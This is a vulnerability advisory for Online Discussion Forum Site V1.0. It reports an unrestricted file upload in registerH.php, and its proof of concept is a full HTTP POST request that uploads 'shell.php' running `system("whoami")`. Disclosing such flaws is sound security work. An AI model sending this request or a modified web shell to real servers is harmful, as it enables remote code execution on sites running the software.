# Online Discussion Forum Site - Arbitrary file vulnerability uploading leads to command execution
+ Author: xuanluansec
# Vendor Homepage
+ https://www.sourcecodester.com/php/14233/online-discussion-forum-site.html
# Software Link
+ https://www.sourcecodester.com/download-code?nid=14233&title=Online+Discussion+Forum+Site
# Overview
+ xuanluansec has discovered a vulnerability classified as critical in Online Discussion Forum Site. The function upload is affected. This operation will result in unrestricted uploads. Remote attacks can cause RCE.
# Vulnerability Details
+ Online Discussion Forum Site V1.0
+ Vulnerable File: registerH.php
+ Parameter Names: filename
+ Attack Type: Remote
# Description
+ A vulnerability, which was classified as critical, has been found in Online Discussion Forum Site. This issue affects the function upload. The manipulation with an unknown input leads to a unrestricted upload vulnerability.


# Proof of Concept (PoC) : 

![1](https://github.com/xuanluansec/vul/blob/main/vul/img/14.png)

```
POST /registerH.php HTTP/1.1
Host: www.online-discussion-forum-site.com:8090
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:123.0) Gecko/20100101 Firefox/123.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------34962993677915401761480767727
Content-Length: 1238
Origin: http://www.online-discussion-forum-site.com:8090
Connection: close
Referer: http://www.online-discussion-forum-site.com:8090/register.php
Cookie: PHPSESSID=evqn78269t7g6bitdanf1717l5
Upgrade-Insecure-Requests: 1

-----------------------------34962993677915401761480767727
Content-Disposition: form-data; name="u_name"

admin1
-----------------------------34962993677915401761480767727
Content-Disposition: form-data; name="f_name"

admin1
-----------------------------34962993677915401761480767727
Content-Disposition: form-data; name="pwd"


-----------------------------34962993677915401761480767727
Content-Disposition: form-data; name="e_mail"


-----------------------------34962993677915401761480767727
Content-Disposition: form-data; name="gender"

1
-----------------------------34962993677915401761480767727
Content-Disposition: form-data; name="dob"


-----------------------------34962993677915401761480767727
Content-Disposition: form-data; name="ima"; filename="shell.php"
Content-Type: text/plain

<?php system("whoami");
-----------------------------34962993677915401761480767727
Content-Disposition: form-data; name="add"


-----------------------------34962993677915401761480767727
Content-Disposition: form-data; name="sta"


-----------------------------34962993677915401761480767727
Content-Disposition: form-data; name="cou"


-----------------------------34962993677915401761480767727--
```

![2](https://github.com/xuanluansec/vul/blob/main/vul/img/15.png)

# Location of vulnerabilities in source code

![3](https://github.com/xuanluansec/vul/blob/main/vul/img/16.png)